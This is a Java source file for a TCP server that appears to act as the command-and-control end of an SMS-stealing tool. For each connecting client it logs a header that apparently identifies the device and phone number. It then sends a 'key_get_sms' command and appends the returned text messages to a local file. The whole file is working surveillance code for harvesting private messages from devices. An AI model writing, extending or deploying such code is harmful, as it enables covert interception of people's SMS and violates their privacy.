package com.anubhav.codereverse.server;

import com.anubhav.codereverse.utils.Constants;
import com.anubhav.codereverse.utils.socket.common.ObjectReader;
import com.anubhav.codereverse.utils.socket.common.ObjectWriter;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

public class TCPServerMain extends Thread {

    private final static String TAG = TCPServerMain.class.getSimpleName();
    private final static String LOCAL_HOST = "127.0.0.1";
    private final static int LOCAL_PORT = 5050;

    private final Socket socket;

    public TCPServerMain(Socket socket) {
        this.socket = socket;
    }

    public void run() {
        ObjectReader reader = null;
        ObjectWriter writer = null;

        try {
            reader = new ObjectReader(socket);
            String header = reader.read(String.class);
            getLog("Response Header: " + header);
            if (header != null) {
                //JSONObject header = new JSONObject(response);
                //String deviceID = header.optString("deviceID", "null");
                //String phoneNumber = header.optString("phoneNumber", "null");
                //getLog("Header: " + deviceID + " - " + phoneNumber);
            } else {
                throw new Exception("Header response is null");
            }

            writer = new ObjectWriter(socket);
            writer.write("{\n" + "\t\"execution_cmd\": \"key_get_sms\",\n" + "\t\"data\": \"\"\n" + "}");
            //JSONObject cmdObject = new JSONObject();
            //cmdObject.put("execution_cmd", Constants.KEY_GET_SMS);
            //cmdObject.put("data", null);
            //writer.write(cmdObject.toString());

            String userSmsArray = reader.read(String.class);
            getLog("Response Sms: " + userSmsArray);

            FileOutputStream fos = new FileOutputStream(new File(System.getProperty("user.dir"), Constants.USER_SMS_FILENAME), true);
            String strResponse = header + " ---> " + userSmsArray;
            fos.write(strResponse.getBytes(StandardCharsets.UTF_8));
            fos.close();
        } catch (Exception e) {
            getLog("Exception--> " + e);
            e.printStackTrace();

        } finally {
            try {
                if (reader != null) reader.close();
                if (writer != null) writer.close();
                socket.close();
            } catch (IOException ignored) {
            }
        }
    }

    /**
     * static methods
     */
    private static void getLog(String msg) {
        System.out.println(TAG + ": " + msg);
    }

    public static void main(String[] args) throws IOException, ClassNotFoundException {
        ServerSocket serversocket = new ServerSocket(LOCAL_PORT, 0, InetAddress.getByName("localhost"));
        String address = serversocket.getInetAddress().getHostAddress() + ":" + serversocket.getLocalPort();
        getLog("connecting... " + address);

        while (true) {
            Socket clientSocket = serversocket.accept();
            getLog("connected");

            new TCPServerMain(clientSocket).start();
        }
    }

}